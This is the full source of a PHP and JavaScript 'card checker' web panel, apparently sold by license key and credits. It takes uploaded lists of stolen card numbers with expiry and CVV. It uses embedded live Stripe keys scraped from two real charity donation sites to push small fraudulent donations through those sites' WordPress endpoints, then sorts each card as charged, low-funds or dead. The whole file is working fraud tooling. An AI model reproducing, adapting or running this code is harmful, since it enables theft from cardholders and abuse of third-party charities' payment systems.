<?php
session_start();
error_reporting(0);
$key_file = 'keys.json';

// --- Functions for Database ---
function get_keys() {
    global $key_file;
    if (!file_exists($key_file)) return [];
    return json_decode(file_get_contents($key_file), true) ?: [];
}

function save_keys($keys) {
    global $key_file;
    file_put_contents($key_file, json_encode($keys, JSON_PRETTY_PRINT));
}

// Logout လုပ်လျှင် Session Lock ကိုပါ ဖြုတ်ပေးရန်
if (isset($_GET['logout'])) {
    $all_keys = get_keys();
    $ckey = $_SESSION['user_key'];
    if (isset($all_keys[$ckey])) {
        // အသုံးပြုသူထွက်သွားလျှင် Lock ကို ပြန်ဖွင့်ပေးသည်
        $all_keys[$ckey]['session_id'] = "";
        save_keys($all_keys);
    }
    session_destroy();
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

// --- Login Logic with Single User Lock ---
if (isset($_POST['login_key'])) {
    $input_key = trim($_POST['key']);
    $all_keys = get_keys();
    if (isset($all_keys[$input_key])) {
        if (date('Y-m-d') > $all_keys[$input_key]['expiry']) {
            $error = "Key Expired!";
        } elseif ($all_keys[$input_key]['credits'] < 5) {
            $error = "Insufficient Credits (Min 5)!";
        } 
        // --- Single User Lock စစ်ဆေးခြင်း ---
        elseif (!empty($all_keys[$input_key]['session_id']) && $all_keys[$input_key]['session_id'] !== session_id()) {
            $error = "Key is already used by another device!";
        } else {
            // Login အောင်မြင်လျှင် Session ID ကို Key နှင့်အတူ သိမ်းလိုက်သည်
            $all_keys[$input_key]['session_id'] = session_id();
            save_keys($all_keys);
            
            $_SESSION['user_key'] = $input_key;
            $_SESSION['logged_in'] = true;
        }
    } else { $error = "Invalid License Key!"; }
}

// --- Auto-Check Validity (Key Expired or Low Credits or Lock Check) ---
if (isset($_SESSION['logged_in'])) {
    $ckey = $_SESSION['user_key'];
    $all_keys = get_keys();
    
    // Key မရှိတော့ခြင်း၊ သက်တမ်းကုန်ခြင်း၊ Credits နည်းခြင်း သို့မဟုတ် တခြားစက်မှ ဝင်လာခြင်းရှိမရှိ စစ်ဆေးသည်
    if (!isset($all_keys[$ckey]) || 
        date('Y-m-d') > $all_keys[$ckey]['expiry'] || 
        $all_keys[$ckey]['credits'] < 5 ||
        $all_keys[$ckey]['session_id'] !== session_id()) {
        
        session_destroy();
        header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
        exit;
    }
}

// Login Form
if (!isset($_SESSION['logged_in'])) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - HEYOz</title>
    <style>
        body { background: #0d1117; color: #c9d1d9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #161b22; padding: 30px; border-radius: 10px; border: 1px solid #30363d; width: 300px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 10px 0; background: #010409; border: 1px solid #58a6ff; color: #58a6ff; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #238636; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .err { color: #f85149; margin-bottom: 10px; font-size: 14px; }
    </style></head>
    <body><div class="login-box"><h2>🔑 HEYOz LOGIN</h2>
    <?php if($error) echo "<div class='err'>$error</div>"; ?>
    <form method="POST"><input type="text" name="key" placeholder="Enter Key" required><button type="submit" name="login_key">LOGIN</button></form>
    </div></body></html>
    <?php exit;
}

// --- Server-Side Logic (Gate Selection & BIN Info & Timing) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
    header("Content-Type: application/json");
    
    // Check Credits and Lock again before processing
    $ckey = $_SESSION['user_key'];
    $all_keys = get_keys();
    if ($all_keys[$ckey]['credits'] < 5 || $all_keys[$ckey]['session_id'] !== session_id()) {
        echo json_encode(["status" => "LOGOUT", "msg" => "Low Credit or Account Locked!"]); exit;
    }

    $data = json_decode(file_get_contents('php://input'), true);
    
    $ccx = $data['card'] ?? "";
    $gate = $data['gate'] ?? "gate1"; 

    if (empty($ccx)) { echo json_encode(["status" => "DEAD", "msg" => "No Card Data"]); exit; }
    
    // Card Parsing Logic
    if (preg_match('/(\d{15,16})[\s|:|\\/]+(\d{1,2})[\s|:|\\/]+(\d{2,4})[\s|:|\\/]+(\d{3,4})/', $ccx, $matches)) {
        $cc = $matches[1]; $mes = $matches[2]; $ano = $matches[3]; $cvv = $matches[4];
    } else {
        preg_match_all("/(\d+)/", $ccx, $list);
        if (count($list[0]) < 4) { echo json_encode(["status" => "DEAD", "msg" => "Invalid Format"]); exit; }
        $cc = $list[0][0]; $mes = $list[0][1]; $ano = $list[0][2]; $cvv = $list[0][3];
    }
    if (strlen($mes) == 1) $mes = "0" . $mes;
    if (strlen($ano) == 4) $ano = substr($ano, 2);

    // BIN Info Logic with Fallback
    $bin = substr($cc, 0, 6);
    $ch_bin = curl_init("https://lookup.binlist.net/" . $bin);
    curl_setopt($ch_bin, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch_bin, CURLOPT_HTTPHEADER, ['Accept-Version: 3']);
    curl_setopt($ch_bin, CURLOPT_TIMEOUT, 3);
    $bin_res = json_decode(curl_exec($ch_bin), true);
    curl_close($ch_bin);
    if ($bin_res && isset($bin_res['scheme'])) {
        $brand = strtoupper($bin_res['scheme'] ?? 'UNK');
        $bank = $bin_res['bank']['name'] ?? 'Unknown Bank';
        $country = $bin_res['country']['emoji'] ?? '🏳️';
        $bin_info = "[$brand - $bank $country]";
    } else {
        $f = substr($cc, 0, 1);
        $fallback_brand = ($f == '4') ? "VISA" : (($f == '5') ? "MASTER" : "UNK");
        $bin_info = "[$fallback_brand - BIN LIMIT]";
    }

    $email = 'jhsha' . rand(100, 999) . '@gmail.com';
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

    if ($gate == "gate1") {
        $pk = 'pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d';
        $site_origin = 'https://texassouthernacademy.com';
    } else {
        $pk = 'pk_live_51MrJUoFYWOfRAL36tEpAYV8qK1PEbiqp3QXs3wjZTLCImyIh2mmkYi8nW2tZBVvfgZG7UVaurtWfwkigqQAD6KJg00VB6fcBoS';
        $site_origin = 'https://christiantvireland.ie';
    }

    // --- Step 1: Tokenization ---
    $ch1 = curl_init('https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch1, CURLOPT_POST, true);
    curl_setopt($ch1, CURLOPT_HTTPHEADER, [
        'authority: api.stripe.com',
        'accept: application/json',
        'content-type: application/x-www-form-urlencoded',
        'origin: ' . $site_origin,
        'referer: https://js.stripe.com/',
        'user-agent: ' . $ua
    ]);
    curl_setopt($ch1, CURLOPT_POSTFIELDS, http_build_query([
        'type' => 'card',
        'billing_details[name]' => 'John Steve',
        'card[number]' => $cc,
        'card[cvc]' => trim($cvv),
        'card[exp_month]' => $mes,
        'card[exp_year]' => $ano,
        'key' => $pk,
        'payment_user_agent' => 'stripe.js/a3e7d2f3d5; stripe-js-v3/a3e7d2f3d5; card-element'
    ]));
    $res1 = json_decode(curl_exec($ch1), true);
    $pm = $res1['id'] ?? null;

    if (!$pm) {
        $err = $res1['error']['message'] ?? "Tokenization Restricted";
        echo json_encode(["status" => "DEAD", "msg" => "$err $bin_info ( HEYOz🔥 )"]); exit;
    }

    // --- Step 2: Charge Process ---
    if ($gate == "gate1") {
        $target = 'https://texassouthernacademy.com/wp-admin/admin-ajax.php';
        $fields = [
            'action' => 'wp_full_stripe_inline_donation_charge', 'wpfs-form-name' => 'donate',
            'wpfs-form-get-parameters' => '%7B%7D', 'wpfs-custom-amount' => 'other', 'wpfs-custom-amount-unique' => '1',
            'wpfs-donation-frequency' => 'one-time', 'wpfs-billing-name' => 'John Steve',
            'wpfs-billing-address-country' => 'US', 'wpfs-billing-address-line-1' => '123 Wailiam street',
            'wpfs-billing-address-city' => 'NewYork', 'wpfs-billing-address-state-select' => 'NY',
            'wpfs-billing-address-zip' => '10038', 'wpfs-card-holder-email' => $email,
            'wpfs-card-holder-name' => 'John Steve', 'wpfs-stripe-payment-method-id' => $pm,
        ];
    } else {
        $target = 'https://christiantvireland.ie/wp-admin/admin-ajax.php';
        $fields = [
            'action' => 'wp_full_stripe_inline_donation_charge', 'wpfs-form-name' => 'website_donation',
            'wpfs-form-get-parameters' => '{}', 'wpfs-custom-amount' => 'other', 'wpfs-custom-amount-unique' => '0.5',
            'wpfs-donation-frequency' => 'one-time', 'wpfs-card-holder-email' => $email, 'wpfs-card-holder-name' => 'John Steve',
            'wpfs-stripe-payment-method-id' => $pm
        ];
    }

    $ch2 = curl_init($target);
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch2, CURLOPT_POST, true);
    curl_setopt($ch2, CURLOPT_HTTPHEADER, [
        'origin: ' . $site_origin,
        'referer: ' . $site_origin,
        'user-agent: ' . $ua,
        'x-requested-with: XMLHttpRequest'
    ]);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query($fields));
    $res2 = json_decode(curl_exec($ch2), true);
    $msg = $res2['message'] ?? "No Response";

    // Common Status Determination
    if (stripos($msg, "Successful") !== false || stripos($msg, "thank you") !== false) { 
        $st = "LIVE"; $m = "CHARGED 🔥"; 
        // Deduction
        $all_keys = get_keys();
        $all_keys[$ckey]['credits'] -= 5;
        save_keys($all_keys);
    }
    elseif (stripos($msg, "insufficient") !== false) { $st = "INSUF"; $m = "LOW FUNDS 💰"; }
    elseif (stripos($msg, "action") !== false || stripos($msg, "authentication") !== false) { $st = "CVV"; $m = "3Ds/CCN 🛡️"; }
    else { $st = "DEAD"; $m = $msg; }
    
    $rem_c = get_keys()[$ckey]['credits'];
    echo json_encode(["status" => $st, "msg" => "$m (Credits: $rem_c) $bin_info ( HEYOz🔥 )"]); exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ 𝐇𝐄𝐘𝐎𝐳 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 DASHBOARD ⚡</title>
    <style>
        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --text: #c9d1d9; }
        * { box-sizing: border-box; }
        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; padding: 10px; margin: 0; display: flex; justify-content: center; }
        .wrapper { width: 100%; max-width: 900px; margin: auto; }
        .header-flex { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        h1 { font-size: 1.5rem; text-align: center; color: #58a6ff; margin: 0; flex-grow: 1; }
        .credit-display { color: #58a6ff; font-weight: bold; border: 1px solid #30363d; padding: 5px 10px; border-radius: 5px; font-size: 14px; background: #21262d; }
        #status-display { background: #010409; border: 1px solid #58a6ff; padding: 12px; border-radius: 8px; text-align: center; margin-bottom: 15px; font-family: monospace; color: #58a6ff; font-weight: bold; min-height: 45px; }
        .gate-select { width: 100%; background: var(--card); color: #58a6ff; border: 1px solid var(--border); padding: 10px; border-radius: 8px; margin-bottom: 15px; font-weight: bold; outline: none; cursor: pointer; }
        .input-group { position: relative; width: 100%; }
        textarea { width: 100%; height: 140px; background: #010409; color: #58a6ff; border: 1px solid var(--border); padding: 12px; border-radius: 8px; font-family: monospace; resize: vertical; outline: none; }
        .upload-label { position: absolute; top: 10px; right: 10px; background: #30363d; color: #c9d1d9; border: 1px solid var(--border); padding: 5px 12px; border-radius: 5px; cursor: pointer; font-size: 12px; }
        .controls { display: flex; gap: 10px; margin: 15px 0; }
        #btn { flex: 2; background: #238636; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 1rem; }
        #stopBtn { flex: 1; background: #da3633; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; font-weight: bold; display: none; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 10px; margin-bottom: 20px; }
        .stat-box { background: var(--card); border: 1px solid var(--border); padding: 12px; border-radius: 10px; text-align: center; }
        .stat-box span { font-size: 20px; font-weight: bold; display: block; margin-top: 5px; }
        .result-box { background: var(--card); border: 1px solid var(--border); border-radius: 10px; margin-bottom: 10px; overflow: hidden; }
        .res-head { padding: 12px 15px; font-weight: bold; font-size: 13px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; }
        .res-head::after { content: '▼'; font-size: 10px; }
        .res-body { display: none; padding: 10px; font-family: monospace; font-size: 12px; border-top: 1px solid var(--border); background: #0d1117; }
        .LIVE { color: #3fb950; } .INSUF { color: #d29922; } .CVV { color: #58a6ff; } .DEAD { color: #f85149; }
        .taken-time { color: #8b949e; font-size: 11px; margin-left: 10px; }
    </style>
</head>
<body>
<div class="wrapper">
    <div class="header-flex">
        <h1>🔥 𝐇𝐄𝐘𝐎𝐳 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 🔥</h1>
        <div class="credit-display">CREDITS: <?php echo number_format(get_keys()[$_SESSION['user_key']]['credits']); ?></div>
    </div>
    
    <div id="status-display">Waiting for start...</div>

    <select id="gate" class="gate-select">
        <option value="gate1">GATE 1:STRIPE 1$</option>
        <option value="gate2">GATE 2: STRIPE 0.5$</option>
    </select>

    <div class="input-group">
        <textarea id="list" placeholder="4111222233334444|01|26|123"></textarea>
        <label for="fileInput" class="upload-label">UPLOAD COMBO</label>
        <input type="file" id="fileInput" accept=".txt" style="display: none;" onchange="handleFileUpload()">
    </div>
    <div class="controls">
        <button id="btn" onclick="start()">START SCANNING</button>
        <button id="stopBtn" onclick="stop()">STOP</button>
    </div>
    <div class="stats">
        <div class="stat-box">TOTAL<span id="c_total">0</span></div>
        <div class="stat-box">HIT<span id="c_live" class="LIVE">0</span></div>
        <div class="stat-box">INSUF<span id="c_insuf" class="INSUF">0</span></div>
        <div class="stat-box">3Ds/CCN<span id="c_cvv" class="CVV">0</span></div>
        <div class="stat-box">DEAD<span id="c_dead" class="DEAD">0</span></div>
    </div>
    <div class="result-box"><div class="res-head" style="color:#3fb950" onclick="toggleBox('l_live', this)">HIT / CHARGED</div><div class="res-body" id="l_live"></div></div>
    <div class="result-box"><div class="res-head" style="color:#d29922" onclick="toggleBox('l_insuf', this)">INSUFFICIENT FUNDS</div><div class="res-body" id="l_insuf"></div></div>
    <div class="result-box"><div class="res-head" style="color:#58a6ff" onclick="toggleBox('l_cvv', this)">3Ds / CCN LIVE</div><div class="res-body" id="l_cvv"></div></div>
    <div class="result-box"><div class="res-head" style="color:#f85149" onclick="toggleBox('l_dead', this)">DECLINED</div><div class="res-body" id="l_dead"></div></div>
</div>

<script>
    let counts = { LIVE: 0, INSUF: 0, CVV: 0, DEAD: 0 };
    let isRunning = false;

    function handleFileUpload() {
        const fileInput = document.getElementById('fileInput');
        const textArea = document.getElementById('list');
        const file = fileInput.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(e) {
                const lines = e.target.result.split('\n');
                const filtered = lines.filter(line => {
                    const parts = line.trim().split(/[|/:\s]+/);
                    if (parts.length >= 3) {
                        let year = parts[2];
                        if (year.length === 2) year = "20" + year;
                        return parseInt(year) > 2024;
                    }
                    return line.trim() !== "";
                });
                textArea.value = filtered.join('\n');
                updateTotal();
            };
            reader.readAsText(file);
        }
    }

    function updateTotal() {
        const lines = document.getElementById('list').value.split('\n').filter(l => l.trim() !== "");
        document.getElementById('c_total').innerText = lines.length;
    }

    function toggleBox(id, header) {
        const body = document.getElementById(id);
        const isOpen = body.style.display === "block";
        body.style.display = isOpen ? "none" : "block";
        header.classList.toggle('active', !isOpen);
    }

    function stop() {
        isRunning = false;
        document.getElementById('stopBtn').style.display = 'none';
        document.getElementById('btn').innerText = 'RESUME CHECKING';
        document.getElementById('btn').disabled = false;
        document.getElementById('status-display').innerText = "Checking Stopped.";
    }

    async function start() {
        const textArea = document.getElementById('list');
        const statusBox = document.getElementById('status-display');
        const gateSelect = document.getElementById('gate');
        let lines = textArea.value.split('\n').filter(l => l.trim() !== "");
        if (lines.length === 0) return;

        isRunning = true;
        const btn = document.getElementById('btn');
        const stopBtn = document.getElementById('stopBtn');
        btn.disabled = true;
        btn.innerText = 'Checking...';
        stopBtn.style.display = 'block';

        while (lines.length > 0 && isRunning) {
            let line = lines[0].trim();
            statusBox.innerText = "Checking: " + line;
            const startTime = performance.now();

            try {
                const res = await fetch(window.location.href, {
                    method: 'POST',
                    body: JSON.stringify({ card: line, gate: gateSelect.value }),
                    headers: { 'Content-Type': 'application/json' }
                });
                const data = await res.json();
                const endTime = performance.now();
                const timeTaken = ((endTime - startTime) / 1000).toFixed(2);

                if (data.status === "LOGOUT") {
                    alert("Account Locked or Credits Finished!");
                    window.location.reload();
                    return;
                }

                counts[data.status]++;
                if(document.getElementById('c_' + data.status.toLowerCase())) {
                    document.getElementById('c_' + data.status.toLowerCase()).innerText = counts[data.status];
                }

                const target = document.getElementById('l_' + data.status.toLowerCase());
                if(target) {
                    const item = document.createElement('div');
                    item.style.padding = "8px 0"; item.style.borderBottom = "1px solid #21262d";
                    item.innerHTML = `[${data.status}] ${line} -> <span class="${data.status}">${data.msg}</span> <span class="taken-time">[${timeTaken}s]</span>`;
                    target.insertBefore(item, target.firstChild);
                }
                
                if(data.status === "LIVE") {
                   location.reload(); 
                }

                lines.shift();
                textArea.value = lines.join('\n');
                updateTotal();
                await new Promise(r => setTimeout(r, 600)); 
            } catch (e) { isRunning = false; }
        }
        
        if (lines.length === 0) {
            statusBox.innerText = "Checking Finished.";
            btn.innerText = 'START CHECKING ';
            btn.disabled = false;
        } else { stop(); }
    }
</script>
</body>
</html>
